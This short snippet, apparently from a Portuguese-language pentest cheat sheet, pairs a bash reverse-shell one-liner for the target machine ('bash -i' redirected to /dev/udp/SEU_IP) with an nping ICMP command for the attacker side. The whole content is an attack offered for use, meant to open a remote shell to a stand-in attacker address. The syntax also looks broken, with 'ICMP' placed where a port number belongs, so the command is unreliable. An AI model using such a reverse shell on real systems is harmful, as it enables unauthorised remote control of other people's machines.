# No alvo:
bash -i >& /dev/udp/SEU_IP/ICMP 0>&1

# No atacante:
sudo nping --icmp -c 1 SEU_IP --data-string "shell"
